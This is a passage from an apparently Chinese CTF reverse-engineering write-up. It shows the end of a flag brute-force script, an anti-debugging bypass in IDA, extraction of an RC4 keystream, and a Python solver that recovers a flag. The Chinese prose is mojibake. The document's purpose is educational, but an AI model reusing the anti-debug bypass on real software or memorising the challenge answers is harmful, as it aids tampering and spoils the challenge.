</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ç¬¬ </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> ä½ç¡®å®šä¸º: &#39;</span><span class=si>{</span><span class=n>best_char</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;å½“å‰ Flag: </span><span class=si>{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>known_flag</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ç¬¬ </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> ä½çˆ†ç ´å¤±è´¥ï¼Œæ‰€æœ‰å­—ç¬¦è¿”å› 0ï¼Ÿ&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;--- çˆ†ç ´å®Œæˆ ---&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æœ€ç»ˆ Flag: </span><span class=si>{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>known_flag</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°flag{m4z3d_vm_jump5__42}</p><h2 id=icall>Icall</h2><p>åœ°å€æ··æ·†+æ§åˆ¶æµå¹³å¦åŒ–ï¼Œä¸ä¼šè¿˜åŸåªèƒ½ä¸ŠåŠ¨è°ƒ</p><p>é¦–å…ˆinité‡Œå‡ºç°äº†pthread_createåˆ›å»ºæ–°çº¿ç¨‹å¯¼è‡´è°ƒè¯•å™¨é™„åŠ å¤±è´¥ï¼ˆåè°ƒï¼‰ï¼Œå› æ­¤ç›´æ¥è·³è¿‡pthread_createçš„è°ƒç”¨ï¼ˆIDAæ¥set ipï¼‰ï¼Œæ¥ç€è·³è¿‡exitçš„è°ƒç”¨</p><p><img src=/img/2025-QWNT/20.png alt=img></p><p><img src=/img/2025-QWNT/21.png alt=img></p><p>æ¥ç€å°±å¯ä»¥F9æ¥åˆ°mainä¸€ç‚¹ç‚¹è°ƒè¯•ï¼Œé¦–å…ˆå…³æ³¨åˆ°è§£å¯†å‡ºæ¥äº†ä¸€ä¸ªå­—ç¬¦ä¸²"arf@gocrying"</p><p><img src=/img/2025-QWNT/22.png alt=img></p><p>ç„¶åè¾“å…¥å­—ç¬¦ä¸²</p><p><img src=/img/2025-QWNT/23.png alt=img></p><p>ç„¶åå¾ªç¯åšäº†æ”¾å°„å¤„ç†</p><p><img src=/img/2025-QWNT/24.png alt=img></p><p>æ¥ç€å°±æ˜¯RC4ï¼Œè§‚å¯Ÿåˆ°äº†initå’Œå¼‚æˆ–ï¼ŒåŒæ—¶è¯¥æµç¨‹è°ƒç”¨äº†ä¸‰æ¬¡</p><p><img src=/img/2025-QWNT/25.png alt=img></p><p><img src=/img/2025-QWNT/26.png alt=img></p><p>ç”±äºä¸€ç›´æ²¡å¤ç°å‡ºæ¥ï¼Œæ‰€ä»¥ç›´æ¥ä¸‹æ¡ä»¶æ–­ç‚¹æå–å¼‚æˆ–å€¼</p><p><img src=/img/2025-QWNT/27.png alt=img></p><p>æå–å‡ºæ¥å¼‚æˆ–çš„v10ï¼ˆkeystreamï¼Œæ­£å¥½æ˜¯90ä¸ªï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡åŠ å¯†30ä¸ªå­—ç¬¦ï¼‰</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;108 91
</span></span></span><span class=line><span class=cl><span class=s2>55 205
</span></span></span><span class=line><span class=cl><span class=s2>108 85
</span></span></span><span class=line><span class=cl><span class=s2>57 250
</span></span></span><span class=line><span class=cl><span class=s2>108 68
</span></span></span><span class=line><span class=cl><span class=s2>40 195
</span></span></span><span class=line><span class=cl><span class=s2>108 198
</span></span></span><span class=line><span class=cl><span class=s2>170 235
</span></span></span><span class=line><span class=cl><span class=s2>108 116
</span></span></span><span class=line><span class=cl><span class=s2>24 65
</span></span></span><span class=line><span class=cl><span class=s2>108 3
</span></span></span><span class=line><span class=cl><span class=s2>111 89
</span></span></span><span class=line><span class=cl><span class=s2>108 111
</span></span></span><span class=line><span class=cl><span class=s2>3 54
</span></span></span><span class=line><span class=cl><span class=s2>108 163
</span></span></span><span class=line><span class=cl><span class=s2>207 53
</span></span></span><span class=line><span class=cl><span class=s2>108 178
</span></span></span><span class=line><span class=cl><span class=s2>222 250
</span></span></span><span class=line><span class=cl><span class=s2>108 0
</span></span></span><span class=line><span class=cl><span class=s2>108 36
</span></span></span><span class=line><span class=cl><span class=s2>108 48
</span></span></span><span class=line><span class=cl><span class=s2>92 72
</span></span></span><span class=line><span class=cl><span class=s2>108 229
</span></span></span><span class=line><span class=cl><span class=s2>137 20
</span></span></span><span class=line><span class=cl><span class=s2>108 113
</span></span></span><span class=line><span class=cl><span class=s2>29 157
</span></span></span><span class=line><span class=cl><span class=s2>108 126
</span></span></span><span class=line><span class=cl><span class=s2>18 128
</span></span></span><span class=line><span class=cl><span class=s2>108 37
</span></span></span><span class=line><span class=cl><span class=s2>73 146
</span></span></span><span class=line><span class=cl><span class=s2>108 50
</span></span></span><span class=line><span class=cl><span class=s2>94 219
</span></span></span><span class=line><span class=cl><span class=s2>108 90
</span></span></span><span class=line><span class=cl><span class=s2>54 133
</span></span></span><span class=line><span class=cl><span class=s2>108 70
</span></span></span><span class=line><span class=cl><span class=s2>42 179
</span></span></span><span class=line><span class=cl><span class=s2>108 49
</span></span></span><span class=line><span class=cl><span class=s2>93 153
</span></span></span><span class=line><span class=cl><span class=s2>108 237
</span></span></span><span class=line><span class=cl><span class=s2>129 196
</span></span></span><span class=line><span class=cl><span class=s2>108 106
</span></span></span><span class=line><span class=cl><span class=s2>6 69
</span></span></span><span class=line><span class=cl><span class=s2>108 31
</span></span></span><span class=line><span class=cl><span class=s2>115 67
</span></span></span><span class=line><span class=cl><span class=s2>108 210
</span></span></span><span class=line><span class=cl><span class=s2>190 48
</span></span></span><span class=line><span class=cl><span class=s2>108 213
</span></span></span><span class=line><span class=cl><span class=s2>185 142
</span></span></span><span class=line><span class=cl><span class=s2>108 4
</span></span></span><span class=line><span class=cl><span class=s2>104 55
</span></span></span><span class=line><span class=cl><span class=s2>108 74
</span></span></span><span class=line><span class=cl><span class=s2>38 95
</span></span></span><span class=line><span class=cl><span class=s2>108 178
</span></span></span><span class=line><span class=cl><span class=s2>222 121
</span></span></span><span class=line><span class=cl><span class=s2>108 116
</span></span></span><span class=line><span class=cl><span class=s2>24 167
</span></span></span><span class=line><span class=cl><span class=s2>108 223
</span></span></span><span class=line><span class=cl><span class=s2>179 191
</span></span></span><span class=line><span class=cl><span class=s2>108 173
</span></span></span><span class=line><span class=cl><span class=s2>193 12
</span></span></span><span class=line><span class=cl><span class=s2>250 151
</span></span></span><span class=line><span class=cl><span class=s2>109 205
</span></span></span><span class=line><span class=cl><span class=s2>195 116
</span></span></span><span class=line><span class=cl><span class=s2>183 160
</span></span></span><span class=line><span class=cl><span class=s2>235 32
</span></span></span><span class=line><span class=cl><span class=s2>203 23
</span></span></span><span class=line><span class=cl><span class=s2>65 0
</span></span></span><span class=line><span class=cl><span class=s2>65 220
</span></span></span><span class=line><span class=cl><span class=s2>89 235
</span></span></span><span class=line><span class=cl><span class=s2>178 157
</span></span></span><span class=line><span class=cl><span class=s2>54 37
</span></span></span><span class=line><span class=cl><span class=s2>19 47
</span></span></span><span class=line><span class=cl><span class=s2>53 62
</span></span></span><span class=line><span class=cl><span class=s2>11 60
</span></span></span><span class=line><span class=cl><span class=s2>250 237
</span></span></span><span class=line><span class=cl><span class=s2>23 55
</span></span></span><span class=line><span class=cl><span class=s2>36 16
</span></span></span><span class=line><span class=cl><span class=s2>52 32
</span></span></span><span class=line><span class=cl><span class=s2>72 4
</span></span></span><span class=line><span class=cl><span class=s2>76 20
</span></span></span><span class=line><span class=cl><span class=s2>20 132
</span></span></span><span class=line><span class=cl><span class=s2>144 88
</span></span></span><span class=line><span class=cl><span class=s2>157 173
</span></span></span><span class=line><span class=cl><span class=s2>48 200
</span></span></span><span class=line><span class=cl><span class=s2>128 186
</span></span></span><span class=line><span class=cl><span class=s2>58 248
</span></span></span><span class=line><span class=cl><span class=s2>146 245
</span></span></span><span class=line><span class=cl><span class=s2>103 194
</span></span></span><span class=line><span class=cl><span class=s2>219 127
</span></span></span><span class=line><span class=cl><span class=s2>164 165
</span></span></span><span class=line><span class=cl><span class=s2>133 191
</span></span></span><span class=line><span class=cl><span class=s2>58 1
</span></span></span><span class=line><span class=cl><span class=s2>179 150
</span></span></span><span class=line><span class=cl><span class=s2>37 59
</span></span></span><span class=line><span class=cl><span class=s2>153 148
</span></span></span><span class=line><span class=cl><span class=s2>13 30
</span></span></span><span class=line><span class=cl><span class=s2>196 26
</span></span></span><span class=line><span class=cl><span class=s2>222 19
</span></span></span><span class=line><span class=cl><span class=s2>69 132
</span></span></span><span class=line><span class=cl><span class=s2>193 205
</span></span></span><span class=line><span class=cl><span class=s2>67 146
</span></span></span><span class=line><span class=cl><span class=s2>209 12
</span></span></span><span class=line><span class=cl><span class=s2>48 7
</span></span></span><span class=line><span class=cl><span class=s2>55 221
</span></span></span><span class=line><span class=cl><span class=s2>142 206
</span></span></span><span class=line><span class=cl><span class=s2>64 234
</span></span></span><span class=line><span class=cl><span class=s2>55 70
</span></span></span><span class=line><span class=cl><span class=s2>113 170
</span></span></span><span class=line><span class=cl><span class=s2>95 9
</span></span></span><span class=line><span class=cl><span class=s2>86 219
</span></span></span><span class=line><span class=cl><span class=s2>121 217
</span></span></span><span class=line><span class=cl><span class=s2>160 141
</span></span></span><span class=line><span class=cl><span class=s2>167 54
</span></span></span><span class=line><span class=cl><span class=s2>145 45
</span></span></span><span class=line><span class=cl><span class=s2>191 232
</span></span></span><span class=line><span class=cl><span class=s2>87 188
</span></span></span><span class=line><span class=cl><span class=s2>12 41
</span></span></span><span class=line><span class=cl><span class=s2>37 235
</span></span></span><span class=line><span class=cl><span class=s2>205 54
</span></span></span><span class=line><span class=cl><span class=s2>251 206
</span></span></span><span class=line><span class=cl><span class=s2>160 131
</span></span></span><span class=line><span class=cl><span class=s2>35 205
</span></span></span><span class=line><span class=cl><span class=s2>23 111
</span></span></span><span class=line><span class=cl><span class=s2>120 238
</span></span></span><span class=line><span class=cl><span class=s2>220 142
</span></span></span><span class=line><span class=cl><span class=s2>82 150
</span></span></span><span class=line><span class=cl><span class=s2>157 126
</span></span></span><span class=line><span class=cl><span class=s2>227 196
</span></span></span><span class=line><span class=cl><span class=s2>47 62
</span></span></span><span class=line><span class=cl><span class=s2>17 39
</span></span></span><span class=line><span class=cl><span class=s2>60 106
</span></span></span><span class=line><span class=cl><span class=s2>86 54
</span></span></span><span class=line><span class=cl><span class=s2>55 99
</span></span></span><span class=line><span class=cl><span class=s2>84 96
</span></span></span><span class=line><span class=cl><span class=s2>32 116
</span></span></span><span class=line><span class=cl><span class=s2>84 52
</span></span></span><span class=line><span class=cl><span class=s2>20 156
</span></span></span><span class=line><span class=cl><span class=s2>136 96
</span></span></span><span class=line><span class=cl><span class=s2>88 245
</span></span></span><span class=line><span class=cl><span class=s2>173 232
</span></span></span><span class=line><span class=cl><span class=s2>200 254
</span></span></span><span class=line><span class=cl><span class=s2>54 69
</span></span></span><span class=line><span class=cl><span class=s2>248 119
</span></span></span><span class=line><span class=cl><span class=s2>143 115
</span></span></span><span class=line><span class=cl><span class=s2>194 91
</span></span></span><span class=line><span class=cl><span class=s2>153 252
</span></span></span><span class=line><span class=cl><span class=s2>165 89
</span></span></span><span class=line><span class=cl><span class=s2>252 101
</span></span></span><span class=line><span class=cl><span class=s2>1 146
</span></span></span><span class=line><span class=cl><span class=s2>147 153
</span></span></span><span class=line><span class=cl><span class=s2>59 60
</span></span></span><span class=line><span class=cl><span class=s2>7 10
</span></span></span><span class=line><span class=cl><span class=s2>30 77
</span></span></span><span class=line><span class=cl><span class=s2>83 13
</span></span></span><span class=line><span class=cl><span class=s2>19 255
</span></span></span><span class=line><span class=cl><span class=s2>236 94
</span></span></span><span class=line><span class=cl><span class=s2>205 49
</span></span></span><span class=line><span class=cl><span class=s2>252 178
</span></span></span><span class=line><span class=cl><span class=s2>12 232
</span></span></span><span class=line><span class=cl><span class=s2>228 78
</span></span></span><span class=line><span class=cl><span class=s2>221 65
</span></span></span><span class=line><span class=cl><span class=s2>156 170
</span></span></span><span class=line><span class=cl><span class=s2>234 2
</span></span></span><span class=line><span class=cl><span class=s2>232 54
</span></span></span><span class=line><span class=cl><span class=s2>170 131
</span></span></span><span class=line><span class=cl><span class=s2>41 222
</span></span></span><span class=line><span class=cl><span class=s2>219 164
</span></span></span><span class=line><span class=cl><span class=s2>127 247
</span></span></span><span class=line><span class=cl><span class=s2>141 39
</span></span></span><span class=line><span class=cl><span class=s2>170 136
</span></span></span><span class=line><span class=cl><span class=s2>45 114
</span></span></span><span class=line><span class=cl><span class=s2>95 34
</span></span></span><span class=line><span class=cl><span class=s2>188 96
</span></span></span><span class=line><span class=cl><span class=s2>220 125
</span></span></span><span class=line><span class=cl><span class=s2>235 189
</span></span></span><span class=line><span class=cl><span class=s2>86 161
</span></span></span><span class=line><span class=cl><span class=s2>206 122
</span></span></span><span class=line><span class=cl><span class=s2>180 247
</span></span></span><span class=line><span class=cl><span class=s2>53 84
</span></span></span><span class=line><span class=cl><span class=s2>97 67
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>),</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>xor</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># print(xor, len(xor))</span>
</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=p>[</span><span class=mi>91</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>68</span><span class=p>,</span> <span class=mi>198</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>163</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>48</span><span class=p>,</span> <span class=mi>229</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>126</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>50</span><span class=p>,</span> <span class=mi>90</span><span class=p>,</span> <span class=mi>70</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>237</span><span class=p>,</span> <span class=mi>106</span><span class=p>,</span> <span class=mi>31</span><span class=p>,</span> <span class=mi>210</span><span class=p>,</span> <span class=mi>213</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>74</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>223</span><span class=p>,</span> <span class=mi>173</span><span class=p>,</span> <span class=mi>151</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>62</span><span class=p>,</span> <span class=mi>237</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>173</span><span class=p>,</span> <span class=mi>186</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=mi>191</span><span class=p>,</span> <span class=mi>150</span><span class=p>,</span> <span class=mi>148</span><span class=p>,</span> <span class=mi>26</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>146</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>206</span><span class=p>,</span> <span class=mi>70</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>217</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>232</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>126</span><span class=p>,</span> <span class=mi>62</span><span class=p>,</span> <span class=mi>106</span><span class=p>,</span> <span class=mi>99</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>156</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>254</span><span class=p>,</span> <span class=mi>119</span><span class=p>,</span> <span class=mi>91</span><span class=p>,</span> <span class=mi>89</span><span class=p>,</span> <span class=mi>146</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>232</span><span class=p>,</span> <span class=mi>65</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>164</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>114</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>189</span><span class=p>,</span> <span class=mi>122</span><span class=p>,</span> <span class=mi>84</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>text</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xF7</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>,</span> <span class=mh>0xC3</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0xC7</span><span class=p>,</span> <span class=mh>0x7F</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0xAB</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0xE0</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0xCB</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0xAF</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x87</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0xC7</span><span class=p>,</span> <span class=mh>0xAC</span><span class=p>,</span> <span class=mh>0x2A</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>29</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>^=</span> <span class=n>text</span><span class=p>[(</span><span class=n>j</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>%</span><span class=mi>30</span><span class=p>]</span> <span class=o>^</span> <span class=n>xor</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>30</span><span class=o>+</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>chr</span><span class=p>,</span> <span class=n>text</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>30</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>65</span><span class=p>,</span> <span class=mi>91</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>15</span> <span class=o>*</span> <span class=p>(</span><span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=mi>65</span> <span class=o>-</span> <span class=mi>11</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span> <span class=o>+</span> <span class=mi>65</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>97</span><span class=p>,</span> <span class=mi>123</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>15</span> <span class=o>*</span> <span class=p>(</span><span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=mi>97</span> <span class=o>-</span> <span class=mi>11</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span> <span class=o>+</span> <span class=mi>97</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>49</span><span class=p>,</span> <span class=mi>59</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>3</span> <span class=o>*</span> <span class=p>(</span><span class=n>text</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=mi>48</span> <span class=o>-</span> <span class=mi>11</span><span class=p>)</span> <span class=o>%</span> <span class=mi>10</span><span class=p>)</span> <span class=o>%</span> <span class=mi>10</span> <span class=o>+</span> <span class=mi>48</span>
